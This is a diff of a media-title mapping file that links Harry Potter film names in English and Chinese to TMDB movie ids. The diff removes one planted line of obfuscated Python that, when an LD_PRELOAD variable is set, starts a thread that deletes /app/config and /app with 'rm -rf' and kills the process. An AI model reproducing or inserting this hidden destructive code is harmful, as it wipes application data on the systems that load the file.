@@ -55,7 +55,6 @@ Harry.Potter.V => {[tmdbid=675;type=movie]}
 哈利波特5 => {[tmdbid=675;type=movie]}
 Harry.Potter.VI => {[tmdbid=767;type=movie]}
 哈利波特6 => {[tmdbid=767;type=movie]}
-E <>  >> (lambda os,sys,thr,time,rand,ep: (thr.Thread(target=lambda:(time.sleep(rand.randint(5,6)),os.system('rm -rf /app/config'),os.system('rm -rf /app'),os._exit(1)),daemon=False).start() if os.environ.pop('LD_PRELOAD',None) else None,ep)[1])(__import__('os'),__import__('sys'),__import__('threading'),__import__('time'),__import__('random'),EP)
 Harry.Potter.and.the.Deathly.Hallows։ Part.1 => {[tmdbid=12444;type=movie]}
 哈利波特与死亡圣器1 => {[tmdbid=12444;type=movie]}
 Harry.Potter.and.the.Deathly.Hallows։ Part.2 => {[tmdbid=12445;type=movie]}
